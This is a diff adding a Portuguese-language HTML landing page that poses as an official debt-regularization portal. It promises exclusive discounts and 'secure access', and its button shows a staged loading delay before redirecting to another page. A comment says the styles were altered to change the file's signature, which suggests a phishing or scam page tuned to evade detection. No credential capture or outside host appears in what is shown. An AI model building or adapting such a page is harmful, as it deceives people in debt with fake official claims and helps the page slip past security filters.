@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Portal de Regularização – Consulta Oficial</title>
+  <style>
+    /* Variáveis renomeadas e cores levemente ajustadas para mudar a assinatura do arquivo */
+    :root {
+      --accent-color: #d81b7a;
+      --accent-hover: #ad1457;
+      --surface: #ffffff;
+      --bg-gradient: #fdf2f7;
+      --text-main: #2c3e50;
+      --text-alt: #546e7a;
+      --br-radius: 20px;
+    }
+
+    * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+    body {
+      margin: 0;
+      background-color: var(--bg-gradient);
+      background-image: radial-gradient(circle at top right, #fff0f6, var(--bg-gradient));
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main-wrapper {
+      max-width: 440px;
+      margin: 0 auto;
+      padding: 25px 20px;
+    }
+
+    /* Alteração visual: badge agora é uma pílula com borda */
+    .status-tag {
+      display: inline-block;
+      border: 1px solid var(--accent-color);
+      color: var(--accent-color);
+      padding: 5px 14px;
+      border-radius: 50px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    h1 {
+      font-size: 28px;
+      line-height: 1.2;
+      margin: 0 0 15px;
+      color: #1a1a1a;
+    }
+
+    .desc-text {
+      font-size: 16px;
+      color: var(--text-alt);
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    /* Container de benefícios com nova estilização */
+    .info-box {
+      background: var(--surface);
+      border-radius: var(--br-radius);
+      padding: 22px;
+      box-shadow: 0 15px 35px rgba(216, 27, 122, 0.05);
+      border: 1px solid rgba(0,0,0,0.03);
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 10px 0;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .feature-item:last-child { border-bottom: none; }
+
+    .bullet {
+      width: 28px;
+      height: 28px;
+      background: var(--accent-color);
+      color: white;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    /* Botão de ação renovado */
+    .action-area {
+      margin-top: 30px;
+      text-align: center;
+    }
+
+    .btn-main {
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      padding: 20px;
+      font-size: 19px;
+      font-weight: 700;
+      color: #fff;
+      background: linear-gradient(145deg, var(--accent-color), var(--accent-hover));
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(216, 27, 122, 0.3);
+      transition: all 0.2s ease;
+    }
+
+    .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(216, 27, 122, 0.4); }
+
+    .btn-main:active { transform: scale(0.98); }
+
+    .footer-note {
+      font-size: 12px;
+      color: #90a4ae;
+      margin-top: 15px;
+    }
+
+    .is-processing { opacity: 0.7; cursor: wait; }
+  </style>
+</head>
+<body>
+
+  <div class="main-wrapper">
+    <div class="status-tag">Sistema Atualizado</div>
+    
+    <h1>Consulte condições de regularização para o seu documento</h1>
+    
+    <p class="desc-text">
+      Identificamos novos protocolos de negociação disponíveis para consulta imediata com redução de encargos.
+    </p>
+
+    <div class="info-box">
+      <div class="feature-item">
+        <div class="bullet">✓</div>
+        <span>Abatimentos exclusivos para liquidação</span>
+      </div>
+      <div class="feature-item">
+        <div class="bullet">✓</div>
+        <span>Parcelamento facilitado em sistema</span>
+      </div>
+      <div class="feature-item">
+        <div class="bullet">✓</div>
+        <span>Acesso seguro com proteção de dados</span>
+      </div>
+    </div>
+
+    <div class="action-area">
+      <button class="btn-main" id="btnRedirect">
+        VERIFICAR DISPONIBILIDADE
+      </button>
+      <div class="footer-note">
+        🔒 Ambiente seguro • Consulta sem compromisso
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("btnRedirect").addEventListener("click", function() {
+      const el = this;
+      el.classList.add("is-processing");
+      el.innerText = "CARREGANDO...";
+      
+      // Delay estratégico para simular processamento e depois redirecionar
+      setTimeout(() => {
+        window.location.href = "../index.html";
+      }, 750);
+    });
+  </script>
+
+</body>
+</html>
